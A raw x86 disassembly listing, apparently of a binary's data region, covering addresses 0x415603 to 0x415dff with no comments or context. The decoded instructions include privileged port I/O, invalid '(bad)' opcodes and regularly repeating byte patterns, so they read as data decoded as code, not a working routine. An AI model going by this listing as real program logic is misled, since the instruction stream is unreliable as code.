  415603:	inc    ecx
  415604:	add    eax,0x78434025
  415609:	bound  eax,QWORD PTR [eax-0x7c]
  41560c:	inc    eax
  41560d:	inc    ecx
  41560e:	sub    ebp,DWORD PTR [ecx+0x54]
  415611:	inc    eax
  415612:	mov    esp,0x6368d70b
  415617:	cmp    DWORD PTR fs:[ecx],edx
  41561a:	add    eax,0x7181a277
  41561f:	push   edx
  415620:	ret    
  415621:	imul   ecx,ebx,0xffffffb1
  415624:	out    0x3d,eax
  415626:	sbb    al,0xc5
  415628:	inc    ecx
  415629:	out    dx,al
  41562a:	ja     0x4155d4
  41562c:	xor    eax,0x1a472914
  415631:	dec    cx
  415633:	inc    ecx
  415634:	sub    eax,0x60c13080
  415639:	lea    edx,[ebx+0x43]
  41563c:	mov    ds,WORD PTR [edi]
  41563e:	popa   
  41563f:	xor    eax,0x302c6762
  415644:	sbb    DWORD PTR [ecx+eax*2+0x40],0xcc4340
  41564c:	add    eax,0x56240
  415651:	inc    ebx
  415652:	inc    eax
  415653:	inc    eax
  415654:	add    BYTE PTR [ecx+0x62],al
  415657:	bound  eax,QWORD PTR [eax]
  415659:	int3   
  41565a:	inc    eax
  41565b:	inc    ebx
  41565c:	add    eax,0x43624041
  415661:	adc    BYTE PTR [ecx+0x5],al
  415664:	inc    eax
  415665:	or     edi,eax
  415667:	inc    esp
  415668:	addr16 popa 
  41566a:	mov    esp,0x69250177
  41566f:	rol    BYTE PTR [eax],0xc4
  415672:	inc    edi
  415673:	push   edx
  415674:	inc    edx
  415675:	data16 shl BYTE PTR ds:[ecx+esi*4-0x7b],0xd4
  41567c:	add    cl,bh
  41567e:	push   edx
  41567f:	inc    esp
  415680:	bound  eax,QWORD PTR [ebx+0x40]
  415683:	adc    BYTE PTR ds:0x4158cc40,al
  415689:	inc    ebx
  41568a:	bound  eax,QWORD PTR [ecx+0x40]
  41568d:	add    eax,0x4140
  415692:	and    eax,0x40400062
  415697:	add    eax,0x84404340
  41569c:	int3   
  41569d:	js     0x41569f
  41569f:	inc    ecx
  4156a0:	adc    BYTE PTR [edx+0xf],ah
  4156a3:	sar    BYTE PTR [ecx+0x43],1
  4156a6:	fs and eax,0x4221d546
  4156ac:	add    eax,0x234e2a90
  4156b1:	cmp    bl,0x35
  4156b4:	arpl   WORD PTR [ecx-0x6407e6a],cx
  4156ba:	cmp    eax,0xd9436f83
  4156bf:	jg     0x415712
  4156c1:	push   ecx
  4156c2:	dec    ebp
  4156c3:	gs pushf 
  4156c5:	shr    DWORD PTR [edi-0x7e],1
  4156c8:	outs   dx,DWORD PTR ds:[esi]
  4156c9:	and    al,0x64
  4156cb:	sub    eax,0x60c37162
  4156d0:	inc    edx
  4156d1:	push   edx
  4156d2:	pop    eax
  4156d3:	data16 daa 
  4156d5:	sub    eax,0x4140002b
  4156da:	inc    eax
  4156db:	inc    ebx
  4156dc:	bound  ax,DWORD PTR ds:0x40434100
  4156e3:	add    eax,0x40054062
  4156e8:	bound  eax,QWORD PTR [ecx+0x40]
  4156eb:	inc    ebx
  4156ec:	inc    eax
  4156ed:	add    eax,0x25405841
  4156f2:	bound  eax,QWORD PTR [eax+0x43]
  4156f5:	inc    eax
  4156f6:	adc    dh,dh
  4156f8:	pusha  
  4156f9:	pop    ebp
  4156fa:	imul   edi,DWORD PTR [eax+0x20],0x4573f69
  415701:	cmp    ebp,ecx
  415703:	sub    BYTE PTR [edx-0x3],ah
  415706:	imul   eax,DWORD PTR [eax-0x6fbcad38],0x6968414c
  415710:	gs dec esi
  415712:	mov    eax,0x6f438067
  415717:	jb     0x415778
  415719:	xor    BYTE PTR [ebx-0x1ecf85e9],ch
  41571f:	and    DWORD PTR [ebx+0x50],0x40434140
  415726:	add    eax,0x43406262
  41572b:	inc    ecx
  41572c:	adc    BYTE PTR [eax],al
  41572e:	inc    eax
  41572f:	add    eax,0x43000562
  415734:	add    BYTE PTR [ecx+0x40],al
  415737:	inc    eax
  415738:	add    eax,0x400062
  41573d:	inc    ebx
  41573e:	inc    eax
  41573f:	js     0x415782
  415741:	inc    ecx
  415742:	bound  eax,QWORD PTR [eax-0x6e]
  415745:	arpl   WORD PTR [eax+0x5828d9b8],ax
  41574b:	lds    ebp,FWORD PTR [edx+0x5]
  41574e:	sub    eax,0xa901c147
  415753:	jp     0x415793
  415755:	nop
  415756:	sub    BYTE PTR [ebp-0x19dbbd79],al
  41575c:	les    esp,FWORD PTR [edx+0x62]
  41575f:	pusha  
  415760:	mov    al,BYTE PTR [eax]
  415762:	jecxz  0x4157b9
  415764:	pop    ds
  415765:	das    
  415766:	(bad)  
  415767:	lock xor esp,DWORD PTR es:[edi+0x69]
  41576c:	cmp    eax,0x64a84f99
  415771:	sub    eax,0xa86c70e1
  415776:	dec    ecx
  415777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415778:	scas   al,BYTE PTR es:[edi]
  415779:	mov    bl,BYTE PTR [edi+0x5406252]
  41577f:	inc    ecx
  415780:	add    BYTE PTR [ebx+0x40],al
  415783:	inc    eax
  415784:	inc    ecx
  415785:	inc    eax
  415786:	inc    eax
  415787:	bound  eax,QWORD PTR ds:0x5624300
  41578d:	add    BYTE PTR [eax+0x40],al
  415790:	add    BYTE PTR [ecx+0x43],al
  415793:	add    BYTE PTR [eax+0x41],al
  415796:	add    eax,0x40436200
  41579b:	inc    eax
  41579c:	add    eax,0x22b69c62
  4157a1:	inc    ebx
  4157a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a3:	push   0x2326d5e9
  4157a8:	dec    ecx
  4157a9:	sar    dl,cl
  4157ab:	cli    
  4157ac:	in     eax,0x38
  4157ae:	stos   BYTE PTR es:[edi],al
  4157af:	jns    0x4157ad
  4157b1:	pop    eax
  4157b2:	lods   al,BYTE PTR ds:[esi]
  4157b3:	inc    eax
  4157b4:	push   ebx
  4157b5:	aad    0x65
  4157b7:	sub    BYTE PTR [edi-0x30],al
  4157ba:	sub    eax,0x2565e11f
  4157bf:	sub    ebx,esp
  4157c1:	jb     0x4157dc
  4157c3:	pusha  
  4157c4:	imul   eax,DWORD PTR gs:[eax+0x34],0x4164d96b
  4157cc:	inc    eax
  4157cd:	add    eax,0x41624340
  4157d2:	test   BYTE PTR [eax],al
  4157d4:	and    eax,0x404043
  4157d9:	add    BYTE PTR ds:0x626210,al
  4157df:	add    eax,0x43404140
  4157e4:	inc    eax
  4157e5:	inc    ecx
  4157e6:	add    eax,0x10664062
  4157eb:	inc    ebx
  4157ec:	bound  eax,QWORD PTR [ecx+eiz*2]
  4157ef:	jo     0x415819
  4157f1:	add    eax,0x6f07411a
  4157f6:	inc    ecx
  4157f7:	push   edx
  4157f8:	mov    edi,0xa343c01a
  4157fd:	inc    esi
  4157fe:	and    DWORD PTR [ebp+0x2a],ecx
  415801:	arpl   WORD PTR [edx+0x30],sp
  415804:	xlat   BYTE PTR ds:[ebx]
  415805:	test   DWORD PTR [esi-0x20],ecx
  415808:	loopne 0x4157e2
  41580a:	mov    eax,0xcc05e1b4
  41580f:	inc    ecx
  415810:	inc    eax
  415811:	add    BYTE PTR [eax],al
  415813:	add    BYTE PTR [eax+0x40],al
  415816:	inc    ebx
  415817:	bound  eax,QWORD PTR [eax]
  415819:	inc    eax
  41581a:	inc    eax
  41581b:	add    eax,0x62434162
  415820:	inc    eax
  415821:	js     0x415833
  415823:	inc    ecx
  415824:	add    eax,0x5404325
  415829:	bound  eax,QWORD PTR [eax+0x40]
  41582c:	inc    ecx
  41582d:	inc    ebx
  41582e:	dec    eax
  41582f:	bound  esp,QWORD PTR ds:0x473db443
  415835:	or     al,BYTE PTR [eax]
  415837:	or     ecx,edi
  415839:	jns    0x41585d
  41583b:	aad    0x85
  41583d:	das    
  41583e:	daa    
  41583f:	inc    eax
  415840:	imul   ecx,esp,0x934363a8
  415846:	jns    0x4157e9
  415848:	jb     0x4158ac
  41584a:	adc    BYTE PTR [edi-0x70],cl
  41584d:	push   esp
  41584e:	add    DWORD PTR [esi+0x52],esi
  415851:	pop    edi
  415852:	inc    edx
  415853:	xor    al,0x43
  415855:	cs ins DWORD PTR es:[edi],dx
  415857:	loope  0x41581e
  415859:	xor    eax,0x3a87146
  41585e:	inc    esp
  41585f:	mov    ebx,0xfa0440fb
  415864:	inc    eax
  415865:	out    0x25,eax
  415867:	inc    ecx
  415868:	bound  eax,QWORD PTR [ebx+0x0]
  41586b:	adc    BYTE PTR [eax+0x0],al
  41586e:	add    eax,0x62410040
  415873:	inc    eax
  415874:	add    BYTE PTR [ebx-0x34],al
  415877:	inc    eax
  415878:	add    eax,0x78434040
  41587d:	bound  eax,QWORD PTR [ecx+0x78]
  415880:	add    eax,0x62404043
  415885:	add    BYTE PTR [edx-0x63],0x58
  415889:	int    0x56
  41588b:	sub    cl,BYTE PTR [ecx+eiz*1+0x61]
  41588f:	imul   edi,DWORD PTR [eax],0x2c434944
  415895:	inc    ecx
  415896:	cmp    eax,0xc484c370
  41589b:	sub    dh,cl
  41589d:	and    BYTE PTR [edx+edx*2+0x48],0xc3
  4158a2:	xchg   ebx,eax
  4158a3:	xchg   DWORD PTR [ecx+0x40],eax
  4158a6:	add    eax,0x43436240
  4158ab:	add    eax,0x62004040
  4158b0:	inc    eax
  4158b1:	add    BYTE PTR [ecx+0x40],al
  4158b4:	inc    ebx
  4158b5:	test   BYTE PTR ds:0x58054041,ah
  4158bb:	inc    eax
  4158bc:	inc    eax
  4158bd:	bound  eax,QWORD PTR [eax+0x66]
  4158c0:	inc    ecx
  4158c1:	inc    eax
  4158c2:	add    eax,0x30248500
  4158c7:	aad    0x44
  4158c9:	inc    edi
  4158ca:	test   al,0x73
  4158cc:	dec    esp
  4158cd:	sbb    al,0x4f
  4158cf:	hlt    
  4158d0:	or     ch,BYTE PTR [ebp+0x12]
  4158d3:	cmp    BYTE PTR [edx-0x7f],ah
  4158d6:	loopne 0x415871
  4158d8:	sub    al,cl
  4158da:	push   ecx
  4158db:	xchg   esi,eax
  4158dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158dd:	inc    eax
  4158de:	das    
  4158df:	imul   eax,DWORD PTR [ecx+0x62],0x800d4741
  4158e6:	loope  0x415958
  4158e8:	push   es
  4158e9:	test   al,0x27
  4158eb:	inc    ebx
  4158ec:	bound  ebp,QWORD PTR [ebx]
  4158ee:	mov    eax,ds:0x40430000
  4158f3:	bound  eax,QWORD PTR ds:0x25404110
  4158f9:	add    ah,cl
  4158fb:	inc    ebx
  4158fc:	add    eax,0x40402562
  415901:	add    BYTE PTR [eax+0x40],al
  415904:	inc    ecx
  415905:	inc    ecx
  415906:	add    eax,0x78434025
  41590b:	bound  eax,QWORD PTR [eax-0x7c]
  41590e:	inc    eax
  41590f:	inc    ecx
  415910:	push   edx
  415911:	inc    esp
  415912:	adc    bh,BYTE PTR [eax+esi*1+0x40]
  415916:	test   BYTE PTR [ebx-0x33],dl
  415919:	fidiv  WORD PTR [edx+eiz*2+0x6382fd8c]
  415920:	pop    ds
  415921:	sub    BYTE PTR [ebx-0x12bdb8a1],ah
  415927:	inc    edi
  415928:	pop    ebp
  415929:	jo     0x4158ce
  41592b:	xor    BYTE PTR [ebp+0x64226ee6],al
  415931:	arpl   WORD PTR [edx+0x6d],dx
  415934:	inc    ebx
  415935:	fisttp WORD PTR [edx-0x69]
  415938:	stc    
  415939:	aad    0x5f
  41593b:	popf   
  41593c:	nop
  41593d:	add    DWORD PTR [ecx+0x41a86621],0x40
  415944:	inc    eax
  415945:	inc    ebx
  415946:	int3   
  415947:	add    BYTE PTR ds:0x56240,al
  41594d:	inc    ebx
  41594e:	inc    eax
  41594f:	inc    eax
  415950:	add    BYTE PTR [ecx+0x62],al
  415953:	bound  eax,QWORD PTR [eax]
  415955:	int3   
  415956:	inc    eax
  415957:	inc    ebx
  415958:	add    eax,0x43624041
  41595d:	adc    BYTE PTR [ecx+0x5],al
  415960:	inc    eax
  415961:	clc    
  415962:	lds    esp,FWORD PTR [eax+0x75]
  415965:	inc    eax
  415966:	pop    eax
  415967:	and    DWORD PTR [edx],edx
  415969:	push   esp
  41596a:	arpl   WORD PTR [ebx-0x22],ax
  41596d:	add    BYTE PTR [ebx+0x52],ah
  415970:	mov    al,0xdd
  415972:	imul   edx,ecx,0xc5376f62
  415978:	adc    eax,0xbb61fca8
  41597d:	inc    edi
  41597e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597f:	jl     0x41594c
  415981:	adc    DWORD PTR [ebp-0x40],esp
  415984:	bound  eax,QWORD PTR [ebx+0x40]
  415987:	adc    BYTE PTR ds:0x4158cc40,al
  41598d:	inc    ebx
  41598e:	bound  eax,QWORD PTR [ecx+0x40]
  415991:	add    eax,0x4140
  415996:	and    eax,0x40400062
  41599b:	add    eax,0x84404340
  4159a0:	int3   
  4159a1:	js     0x4159a3
  4159a3:	inc    ecx
  4159a4:	adc    BYTE PTR [edx+0xf],ah
  4159a7:	pop    ds
  4159a8:	add    ah,bl
  4159aa:	sbb    DWORD PTR [edx+0x4c],eax
  4159ad:	jno    0x4159b9
  4159af:	aas    
  4159b0:	xor    BYTE PTR [ebx+0x64],ch
  4159b3:	sub    al,BYTE PTR [ecx+0x3c]
  4159b6:	inc    ebx
  4159b7:	leave  
  4159b8:	in     al,0x42
  4159ba:	dec    eax
  4159bb:	adc    DWORD PTR [eax+0x2ac4147],esp
  4159c1:	and    DWORD PTR [eax],esi
  4159c3:	push   eax
  4159c4:	push   esp
  4159c5:	add    BYTE PTR [edi-0x28],0x28
  4159c9:	inc    ebp
  4159ca:	inc    edx
  4159cb:	or     BYTE PTR [eax+ecx*2+0x24],ah
  4159cf:	jmp    0x4159fb
  4159d1:	mov    eax,ds:0x414000d5
  4159d6:	inc    eax
  4159d7:	inc    ebx
  4159d8:	bound  ax,DWORD PTR ds:0x40434100
  4159df:	add    eax,0x40054062
  4159e4:	bound  eax,QWORD PTR [ecx+0x40]
  4159e7:	inc    ebx
  4159e8:	inc    eax
  4159e9:	add    eax,0x25405841
  4159ee:	bound  eax,QWORD PTR [eax+0x43]
  4159f1:	inc    eax
  4159f2:	adc    bl,cl
  4159f4:	push   edx
  4159f5:	pop    edi
  4159f6:	mov    BYTE PTR [esi+0x38],bh
  4159f9:	pop    esp
  4159fa:	cmp    ecx,DWORD PTR [eax+0x38]
  4159fd:	fld    QWORD PTR [edi+0x56]
  415a00:	sub    BYTE PTR [ebp-0x5a],0x4a
  415a04:	pop    ebx
  415a05:	dec    eax
  415a06:	test   edi,edx
  415a08:	es popa 
  415a0a:	fs jle 0x415a6f
  415a0d:	enter  0xd643,0x45
  415a11:	arpl   WORD PTR [eax-0x40],bx
  415a14:	mov    ch,0x78
  415a16:	nop
  415a17:	sbb    eax,0xb1cc3f02
  415a1c:	arpl   ax,bp
  415a1e:	jge    0x415a03
  415a20:	sub    BYTE PTR [ecx+0x53],dl
  415a23:	inc    eax
  415a24:	inc    ecx
  415a25:	inc    ebx
  415a26:	inc    eax
  415a27:	add    eax,0x43406262
  415a2c:	inc    ecx
  415a2d:	adc    BYTE PTR [eax],al
  415a2f:	inc    eax
  415a30:	add    eax,0x43000562
  415a35:	add    BYTE PTR [ecx+0x40],al
  415a38:	inc    eax
  415a39:	add    eax,0x400062
  415a3e:	inc    ebx
  415a3f:	inc    eax
  415a40:	js     0x415a83
  415a42:	inc    ecx
  415a43:	bound  eax,QWORD PTR [eax-0x4]
  415a46:	adc    DWORD PTR [esi+0x43],esp
  415a49:	xchg   ebp,eax
  415a4a:	inc    esi
  415a4b:	xor    ecx,ebp
  415a4d:	inc    ebp
  415a4e:	push   eax
  415a4f:	iret   
  415a50:	ror    DWORD PTR [esi-0x7f],1
  415a53:	jecxz  0x415a77
  415a55:	rol    BYTE PTR [ecx+0x73c77fc0],1
  415a5b:	jno    0x415a12
  415a5d:	cmp    al,bl
  415a5f:	(bad)  
  415a60:	out    dx,eax
  415a61:	jnp    0x4159e5
  415a63:	in     eax,dx
  415a64:	fs movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415a67:	adc    eax,0x54062bd
  415a6c:	inc    ecx
  415a6d:	add    BYTE PTR [ebx+0x40],al
  415a70:	inc    eax
  415a71:	inc    ecx
  415a72:	inc    eax
  415a73:	inc    eax
  415a74:	bound  eax,QWORD PTR ds:0x5624300
  415a7a:	add    BYTE PTR [eax+0x40],al
  415a7d:	add    BYTE PTR [ecx+0x43],al
  415a80:	add    BYTE PTR [eax+0x41],al
  415a83:	add    eax,0x40436200
  415a88:	inc    eax
  415a89:	add    eax,0x337a4762
  415a8e:	stc    
  415a8f:	std    
  415a90:	inc    edx
  415a91:	mov    al,ds:0x1bd76e0a
  415a96:	arpl   WORD PTR [ebx+0x27],sp
  415a99:	or     DWORD PTR [eax],ebp
  415a9b:	jnp    0x415a9f
  415a9d:	out    dx,eax
  415a9e:	cdq    
  415a9f:	inc    ebp
  415aa0:	and    BYTE PTR [edx+0x42],ah
  415aa3:	stos   BYTE PTR es:[edi],al
  415aa4:	in     eax,dx
  415aa5:	sbb    edx,DWORD PTR [edx+0x30]
  415aa8:	add    al,BYTE PTR [esi+0x29]
  415aab:	xor    ch,BYTE PTR [esi]
  415aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aae:	lds    edi,FWORD PTR [edx-0x7473ae35]
  415ab4:	push   ebp
  415ab5:	pop    esi
  415ab6:	inc    ecx
  415ab7:	inc    eax
  415ab8:	add    eax,0x41624340
  415abd:	test   BYTE PTR [eax],al
  415abf:	and    eax,0x404043
  415ac4:	add    BYTE PTR ds:0x626210,al
  415aca:	add    eax,0x43404140
  415acf:	inc    eax
  415ad0:	inc    ecx
  415ad1:	add    eax,0x10664062
  415ad6:	inc    ebx
  415ad7:	(bad)  
  415ad8:	leave  
  415ad9:	popf   
  415ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415adb:	cmp    eax,0x64017262
  415ae0:	es push esi
  415ae2:	adc    eax,0x40064757
  415ae7:	add    DWORD PTR [eax-0x7b3fbe3e],eax
  415aed:	test   al,0x80
  415aef:	inc    cx
  415af1:	xor    ebx,ebp
  415af3:	int    0x43
  415af5:	pop    edx
  415af6:	es fs jb 0x415b1a
  415afa:	sub    al,0x76
  415afc:	nop
  415afd:	test   eax,0x4848bd49
  415b02:	add    ebp,0x5
  415b05:	int3   
  415b06:	inc    ecx
  415b07:	inc    eax
  415b08:	add    BYTE PTR [eax],al
  415b0a:	add    BYTE PTR [eax+0x40],al
  415b0d:	inc    ebx
  415b0e:	bound  eax,QWORD PTR [eax]
  415b10:	inc    eax
  415b11:	inc    eax
  415b12:	add    eax,0x62434162
  415b17:	inc    eax
  415b18:	js     0x415b2a
  415b1a:	inc    ecx
  415b1b:	add    eax,0x5404325
  415b20:	bound  eax,QWORD PTR [eax+0x40]
  415b23:	inc    ecx
  415b24:	inc    ebx
  415b25:	sbb    ch,al
  415b27:	add    BYTE PTR [edx],dh
  415b29:	bound  edx,QWORD PTR [ecx]
  415b2b:	les    esp,FWORD PTR [ebx+eax*2-0x5a]
  415b2f:	xor    dl,BYTE PTR [edi]
  415b31:	jb     0x415afe
  415b33:	dec    edi
  415b34:	mov    esp,0x24123bd1
  415b39:	aad    0x48
  415b3b:	leave  
  415b3c:	pop    edi
  415b3d:	jle    0x415ac4
  415b3f:	and    eax,0x436241
  415b44:	adc    BYTE PTR [eax+0x0],al
  415b47:	add    eax,0x62410040
  415b4c:	inc    eax
  415b4d:	add    BYTE PTR [ebx-0x34],al
  415b50:	inc    eax
  415b51:	add    eax,0x78434040
  415b56:	bound  eax,QWORD PTR [ecx+0x78]
  415b59:	add    eax,0x62404043
  415b5e:	xor    DWORD PTR [esi],0x353f413a
  415b64:	dec    eax
  415b65:	pop    esi
  415b66:	push   ebp
  415b67:	dec    eax
  415b68:	add    dh,BYTE PTR [eiz*2-0x78e548ad]
  415b6f:	and    ah,BYTE PTR [esp+eiz*2+0x44]
  415b73:	inc    ecx
  415b74:	inc    eax
  415b75:	add    eax,0x43436240
  415b7a:	add    eax,0x62004040
  415b7f:	inc    eax
  415b80:	add    BYTE PTR [ecx+0x40],al
  415b83:	inc    ebx
  415b84:	test   BYTE PTR ds:0x58054041,ah
  415b8a:	inc    eax
  415b8b:	inc    eax
  415b8c:	bound  eax,QWORD PTR [eax+0x66]
  415b8f:	inc    ecx
  415b90:	inc    eax
  415b91:	add    eax,0x8bcb8000
  415b96:	sub    esi,DWORD PTR [eax]
  415b98:	push   ds
  415b99:	bound  eax,QWORD PTR [esi+0xb]
  415b9c:	inc    ecx
  415b9d:	bound  edi,QWORD PTR [ebp+0x45]
  415ba0:	in     al,0x5
  415ba2:	sub    DWORD PTR [ebx+eax*2+0x62658f07],edi
  415ba9:	retf   
  415baa:	cli    
  415bab:	inc    edx
  415bac:	xor    BYTE PTR [edi-0x3e],bh
  415baf:	sbb    al,0x70
  415bb1:	add    BYTE PTR [eax],al
  415bb3:	inc    ebx
  415bb4:	inc    eax
  415bb5:	bound  eax,QWORD PTR ds:0x25404110
  415bbb:	add    ah,cl
  415bbd:	inc    ebx
  415bbe:	add    eax,0x40402562
  415bc3:	add    BYTE PTR [eax+0x40],al
  415bc6:	inc    ecx
  415bc7:	inc    ecx
  415bc8:	add    eax,0x78434025
  415bcd:	bound  eax,QWORD PTR [eax-0x7c]
  415bd0:	inc    eax
  415bd1:	inc    ecx
  415bd2:	adc    al,dl
  415bd4:	mov    esp,0x6581e2ac
  415bd9:	int    0xb0
  415bdb:	fsubr  DWORD PTR [ebx+0x47]
  415bde:	rcl    ebx,1
  415be0:	dec    ebp
  415be1:	inc    ecx
  415be2:	adc    eax,0x6a8514ca
  415be7:	add    DWORD PTR [ebx+0x1c5242ce],esp
  415bed:	inc    ebx
  415bee:	mov    ds:0x36361771,al
  415bf3:	retf   
  415bf4:	arpl   WORD PTR [eax-0x6f1eafa],dx
  415bfa:	hlt    
  415bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bfc:	inc    ecx
  415bfd:	inc    eax
  415bfe:	inc    eax
  415bff:	inc    ebx
  415c00:	int3   
  415c01:	add    BYTE PTR ds:0x56240,al
  415c07:	inc    ebx
  415c08:	inc    eax
  415c09:	inc    eax
  415c0a:	add    BYTE PTR [ecx+0x62],al
  415c0d:	bound  eax,QWORD PTR [eax]
  415c0f:	int3   
  415c10:	inc    eax
  415c11:	inc    ebx
  415c12:	add    eax,0x43624041
  415c17:	adc    BYTE PTR [ecx+0x5],al
  415c1a:	inc    eax
  415c1b:	add    eax,0x260a3a37
  415c20:	arpl   WORD PTR [eax+ebx*8+0x35],sp
  415c24:	inc    ebx
  415c25:	mov    eax,ds:0x43a63483
  415c2a:	mov    esi,0x4041d115
  415c2f:	inc    esp
  415c30:	push   edx
  415c31:	enter  0x6252,0xc3
  415c35:	mov    dl,0x80
  415c37:	and    ebp,eax
  415c39:	repz leave 
  415c3b:	clc    
  415c3c:	fisubr DWORD PTR [eax]
  415c3e:	sub    eax,0xa81c0e7a
  415c43:	or     al,0x39
  415c45:	xchg   esi,eax
  415c46:	inc    ebx
  415c47:	arpl   WORD PTR [ebp+0x4562153d],bp
  415c4d:	xor    DWORD PTR [edx+0x43],esp
  415c50:	inc    eax
  415c51:	adc    BYTE PTR ds:0x4158cc40,al
  415c57:	inc    ebx
  415c58:	bound  eax,QWORD PTR [ecx+0x40]
  415c5b:	add    eax,0x4140
  415c60:	and    eax,0x40400062
  415c65:	add    eax,0x84404340
  415c6a:	int3   
  415c6b:	js     0x415c6d
  415c6d:	inc    ecx
  415c6e:	adc    BYTE PTR [edx+0xf],ah
  415c71:	or     BYTE PTR [ecx+0x63],0x56
  415c75:	retf   
  415c76:	test   BYTE PTR [ecx+0x77],al
  415c79:	mov    ebp,0x41c033e7
  415c7e:	ret    
  415c7f:	inc    ebx
  415c80:	imul   esi,DWORD PTR [edx],0x47
  415c83:	pop    ds
  415c84:	mov    eax,0x3f306c5f
  415c89:	inc    eax
  415c8a:	and    BYTE PTR [ecx-0x36],ch
  415c8d:	cmp    BYTE PTR [edx],bh
  415c8f:	test   al,0x5a
  415c91:	add    BYTE PTR [eax+0x62],ah
  415c94:	test   al,0xc5
  415c96:	bound  eax,QWORD PTR [edi-0x5a]
  415c99:	es push esi
  415c9b:	ins    BYTE PTR es:[edi],dx
  415c9c:	adc    DWORD PTR [esi-0x58],esp
  415c9f:	test   DWORD PTR [edx+0x5a250a],edx
  415ca5:	inc    eax
  415ca6:	inc    ecx
  415ca7:	inc    eax
  415ca8:	inc    ebx
  415ca9:	bound  ax,DWORD PTR ds:0x40434100
  415cb0:	add    eax,0x40054062
  415cb5:	bound  eax,QWORD PTR [ecx+0x40]
  415cb8:	inc    ebx
  415cb9:	inc    eax
  415cba:	add    eax,0x25405841
  415cbf:	bound  eax,QWORD PTR [eax+0x43]
  415cc2:	inc    eax
  415cc3:	adc    BYTE PTR [ecx+edx*8-0x7cffbcee],ch
  415cca:	std    
  415ccb:	jge    0x415d0f
  415ccd:	arpl   sp,ax
  415ccf:	nop
  415cd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd1:	inc    ebx
  415cd2:	adc    DWORD PTR [esi-0x3c],edx
  415cd5:	pusha  
  415cd6:	not    ah
  415cd8:	pop    ebx
  415cd9:	add    DWORD PTR [ebx],esp
  415cdb:	arpl   WORD PTR [eax+0x10],dx
  415cde:	fs inc ebx
  415ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce1:	jl     0x415d2d
  415ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ce4:	bound  ebx,QWORD PTR gs:[ebp-0x2f]
  415ce8:	icebp  
  415ce9:	and    ebx,0x40
  415cec:	inc    ecx
  415ced:	inc    ebx
  415cee:	inc    eax
  415cef:	add    eax,0x43406262
  415cf4:	inc    ecx
  415cf5:	adc    BYTE PTR [eax],al
  415cf7:	inc    eax
  415cf8:	add    eax,0x43000562
  415cfd:	add    BYTE PTR [ecx+0x40],al
  415d00:	inc    eax
  415d01:	add    eax,0x400062
  415d06:	inc    ebx
  415d07:	inc    eax
  415d08:	js     0x415d4b
  415d0a:	inc    ecx
  415d0b:	bound  eax,QWORD PTR [eax+0x52]
  415d0e:	jg     0x415cb9
  415d10:	sub    BYTE PTR [eax-0x3227b9ad],bl
  415d16:	fcom   DWORD PTR [ebx+esi*8+0x6180e36b]
  415d1d:	out    dx,al
  415d1e:	xchg   ecx,eax
  415d1f:	or     eax,0x331db696
  415d24:	push   esp
  415d25:	add    DWORD PTR [ebp-0x18],0x1e86da00
  415d2c:	mov    eax,ds:0xd2538963
  415d31:	inc    ecx
  415d32:	inc    ebp
  415d33:	arpl   WORD PTR [edx+0x40],sp
  415d36:	add    eax,0x40430041
  415d3b:	inc    eax
  415d3c:	inc    ecx
  415d3d:	inc    eax
  415d3e:	inc    eax
  415d3f:	bound  eax,QWORD PTR ds:0x5624300
  415d45:	add    BYTE PTR [eax+0x40],al
  415d48:	add    BYTE PTR [ecx+0x43],al
  415d4b:	add    BYTE PTR [eax+0x41],al
  415d4e:	add    eax,0x40436200
  415d53:	inc    eax
  415d54:	add    eax,0x60a45062
  415d59:	bound  esp,QWORD PTR [ebx+0x43]
  415d5c:	dec    edx
  415d5d:	add    ah,BYTE PTR [ecx]
  415d5f:	push   edx
  415d60:	inc    ebx
  415d61:	pop    edi
  415d62:	adc    dh,BYTE PTR [eax]
  415d64:	pop    ebp
  415d65:	test   eax,0x74c5c534
  415d6a:	sub    al,0xa4
  415d6c:	lods   eax,DWORD PTR ds:[esi]
  415d6d:	push   esi
  415d6e:	aas    
  415d6f:	sbb    ecx,DWORD PTR [ecx+0x5a]
  415d72:	test   eax,0x540414e
  415d77:	inc    eax
  415d78:	inc    ebx
  415d79:	bound  eax,QWORD PTR [ecx-0x7c]
  415d7c:	add    BYTE PTR ds:0x404043,ah
  415d82:	add    BYTE PTR ds:0x626210,al
  415d88:	add    eax,0x43404140
  415d8d:	inc    eax
  415d8e:	inc    ecx
  415d8f:	add    eax,0x10664062
  415d94:	inc    ebx
  415d95:	bound  ecx,QWORD PTR [ebx]
  415d97:	or     BYTE PTR [edx],0xfd
  415d9a:	xor    al,0xa9
  415d9c:	bound  ecx,QWORD PTR [ebp+0x56a12959]
  415da2:	inc    eax
  415da3:	inc    ebp
  415da4:	adc    eax,DWORD PTR [ebx-0x21]
  415da7:	imul   ebp,DWORD PTR [edx],0x0
  415daa:	pop    esp
  415dab:	xor    eax,0x18690a0
  415db0:	loope  0x415dea
  415db2:	cmp    al,BYTE PTR [eax+0x79fff152]
  415db8:	mov    edi,0x5c5c3e4
  415dbd:	int3   
  415dbe:	inc    ecx
  415dbf:	inc    eax
  415dc0:	add    BYTE PTR [eax],al
  415dc2:	add    BYTE PTR [eax+0x40],al
  415dc5:	inc    ebx
  415dc6:	bound  eax,QWORD PTR [eax]
  415dc8:	inc    eax
  415dc9:	inc    eax
  415dca:	add    eax,0x62434162
  415dcf:	inc    eax
  415dd0:	js     0x415de2
  415dd2:	inc    ecx
  415dd3:	add    eax,0x5404325
  415dd8:	bound  eax,QWORD PTR [eax+0x40]
  415ddb:	inc    ecx
  415ddc:	inc    ebx
  415ddd:	aaa    
  415dde:	inc    ebx
  415ddf:	or     eax,DWORD PTR [eax+0x4848d064]
  415de5:	mov    al,0xd1
  415de7:	add    BYTE PTR [ebx+eiz*8],ah
  415dea:	retf   
  415deb:	adc    eax,0xd1c10543
  415df0:	add    eax,0x16cbbf43
  415df5:	jnp    0x415daa
  415df7:	sub    eax,DWORD PTR [ecx+eiz*8]
  415dfa:	mov    esi,0xdcbc2052
  415dff:	inc    esi
